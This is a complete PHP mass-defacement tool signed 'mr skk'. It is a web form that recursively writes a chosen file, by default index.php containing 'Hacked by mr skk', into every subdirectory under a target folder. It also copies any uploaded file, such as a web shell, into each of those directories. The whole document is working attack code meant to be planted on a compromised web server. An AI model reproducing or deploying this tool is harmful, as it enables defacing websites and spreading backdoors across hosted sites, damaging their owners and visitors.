<?php
echo "<title>Folder mr skk Ganteng</title>";
echo "<link href='http://fonts.googleapis.com/css?family=Electrolize' rel='stylesheet' type='text/css'>";
echo "<body bgcolor='saddlebrown'><font color='black'><font face='Electrolize'>";
echo "<center><form method='POST' enctype='multipart/form-data'>";

// Logo dengan ukuran lebih kecil
echo "<img src='https://res.cloudinary.com/di1pwoapk/image/upload/v1741152887/skk_lq8ul0.png' width='110' height='110'>";
echo "<hr color='black'><font color='black'>Target Folder</font><br>";
echo "<input cols='10' rows='10' type='text' style='color:lime;background-color:#000000' name='base_dir' value='".getcwd()."'><br><br>";
echo "<font color='black'>Name of File</font><br><input cols='10' rows='10' type='text' style='color:lime;background-color:#000000' name='andela' value='index.php'><br>";
echo "<font color='black'>Script na asupken</font><br><textarea cols='25' rows='8' style='color:lime;background-color:#000000;background-image:url(#);' name='index'>Hacked by mr skk</textarea><br>";
echo "<font color='black'>Upload File</font><br><input type='file' name='upload_file'><br>";
echo "<input type='submit' value='TEBARKEN MANG'></form></center>";

if (isset($_POST['base_dir'])) {
    if (!file_exists($_POST['base_dir'])) {
        die ($_POST['base_dir']." Not Found !<br>");
    }

    if (!is_dir($_POST['base_dir'])) {
        die ($_POST['base_dir']." Is Not A Directory !<br>");
    }

    // Fungsi untuk mengupload ke semua direktori dan subdirektori
    function uploadToDirectories($baseDir, $fileName, $fileContent, $uploadedFile) {
        // Mendapatkan semua item dalam direktori
        $files = scandir($baseDir);

        foreach ($files as $file) {
            // Lewati . dan ..
            if ($file == '.' || $file == '..') continue;

            $currentPath = $baseDir . '/' . $file;

            // Jika item adalah direktori, panggil fungsi ini secara rekursif
            if (is_dir($currentPath)) {
                // Menyimpan konten script deface ke file
                $indexPath = $currentPath . '/' . $fileName;
                if (file_put_contents($indexPath, $fileContent) !== false) {
                    echo "<hr color='black'>>> <font color='black'>Saved: $indexPath&nbsp&nbsp&nbsp&nbsp</font><font color='lime'>(✔)</font>";
                }

                // Upload file ke direktori ini jika ada file yang diupload
                if (isset($uploadedFile) && $uploadedFile['error'] == UPLOAD_ERR_OK) {
                    $uploadPath = $currentPath . '/' . $uploadedFile['name'];
                    if (move_uploaded_file($uploadedFile['tmp_name'], $uploadPath)) {
                        echo "<hr color='black'>>> <font color='black'>Uploaded: $uploadPath&nbsp&nbsp&nbsp&nbsp</font><font color='lime'>(✔)</font>";
                    } else {
                        echo "<hr color='black'>>> <font color='red'>Failed to upload: $uploadPath</font>";
                    }
                }

                // Rekursif untuk subdirektori
                uploadToDirectories($currentPath, $fileName, $fileContent, $uploadedFile);
            }
        }
    }

    // Memanggil fungsi untuk memulai upload
    uploadToDirectories($_POST['base_dir'], $_POST['andela'], $_POST['index'], $_FILES['upload_file']);
}
?>
